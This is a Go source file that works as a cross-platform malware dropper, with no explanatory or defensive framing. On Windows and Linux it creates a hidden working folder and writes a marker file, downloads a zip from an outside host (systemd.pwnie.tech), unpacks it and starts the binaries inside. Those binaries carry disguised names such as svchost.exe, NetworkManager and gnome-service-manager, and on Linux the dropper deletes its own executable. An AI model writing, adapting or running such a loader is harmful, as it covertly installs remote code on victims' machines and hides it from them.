package main

import (
	"os"
	"io/ioutil"
	"runtime"
	"net/http"
	"fmt"
	"io"
	"archive/zip"
	"path/filepath"
	//"os/exec"
	//"unicode"
	"os/exec"
)

func main(){
	myos := runtime.GOOS
	if myos=="windows" {
		if _, err := os.Stat("\\Users\\Administrator\\AppData\\Roaming\\Templow\\flag.txt"); os.IsNotExist(err) {
			os.Mkdir("\\Users\\Administrator\\AppData\\Roaming\\Templow",os.FileMode(0777))
			ioutil.WriteFile("\\Users\\Administrator\\AppData\\Roaming\\Templow\\flag.txt",[]byte("hello"),0777)
			os.Chdir("\\Users\\Administrator\\AppData\\Roaming\\Templow")
			downloadzip("http://systemd.pwnie.tech/file.zip")
			Unzip("file.zip","\\Users\\Administrator\\AppData\\Roaming\\Templow")
			exec.Command("cmd", "/c start /b svchost.exe").Start()
			exec.Command("cmd", "/c start /b wf.exe").Start()
			os.Exit(0)
		} else {
			os.Exit(3)
		}
	} else {
		if _, err := os.Stat("/tmp/gnome-software-F5DEKL/flag.txt"); os.IsNotExist(err) {
			os.Mkdir("/tmp/gnome-software-F5DEKL",os.FileMode(0777))
			ioutil.WriteFile("/tmp/gnome-software-F5DEKL/flag.txt",[]byte("hello"),0777)
			os.Chdir("/tmp/gnome-software-F5DEKL")
			downloadzip("http://systemd.pwnie.tech/file.zip")
			Unzip("file.zip","/tmp/gnome-software-F5DEKL")
			//replace link
			os.Remove("/tmp/gnome-software-F5DEKL/file.zip")
			s, _ := os.Readlink("/proc/self/exe");
			exec.Command("./gnome-service-manager","> /dev/null 2>&1 &").Start()
			exec.Command("./NetworkManager", "> /dev/null 2>&1 &").Start()
			os.Remove(s)
			os.Exit(0)
		} else {
			os.Exit(3)
		}
	}
}

func downloadzip(url string){

	fileName := "file.zip"
	fmt.Println("Downloading file...")

	output, err := os.Create(fileName)
	defer output.Close()

	response, err := http.Get(url)
	if err != nil {
		fmt.Println("Error while downloading", url, "-", err)
		return
	}
	defer response.Body.Close()

	n, err := io.Copy(output, response.Body)

	fmt.Println(n, "bytes downloaded")
}

func Unzip(src string, dest string) ([]string, error) {

	var filenames []string

	r, err := zip.OpenReader(src)
	if err != nil {
		return filenames, err
	}
	defer r.Close()

	for _, f := range r.File {

		rc, err := f.Open()
		if err != nil {
			return filenames, err
		}
		defer rc.Close()

		// Store filename/path for returning and using later on
		fpath := filepath.Join(dest, f.Name)
		filenames = append(filenames, fpath)

		if f.FileInfo().IsDir() {

			// Make Folder
			os.MkdirAll(fpath, os.ModePerm)

		} else {

			// Make File
			if err = os.MkdirAll(filepath.Dir(fpath), os.ModePerm); err != nil {
				return filenames, err
			}

			outFile, err := os.OpenFile(fpath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
			if err != nil {
				return filenames, err
			}

			_, err = io.Copy(outFile, rc)

			// Close the file without defer to close before next iteration of loop
			outFile.Close()

			if err != nil {
				return filenames, err
			}

		}
	}
	return filenames, nil
}


